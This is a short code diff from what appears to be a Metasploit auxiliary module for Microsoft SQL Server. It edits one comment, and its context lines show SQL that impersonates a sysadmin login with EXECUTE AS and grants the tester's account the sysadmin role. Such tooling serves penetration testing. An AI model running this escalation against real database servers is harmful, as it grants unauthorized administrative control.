@@ -146,7 +146,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def escalate_privs(imp_user_sysadmin)
-    # Create the evil stored procedure WITH EXECUTE AS OWNER
+    # Impersonate the first sysadmin user on the list
     evil_sql_create = "EXECUTE AS Login = '#{imp_user_sysadmin}';
     EXEC sp_addsrvrolemember '#{datastore['USERNAME']}','sysadmin';"
 
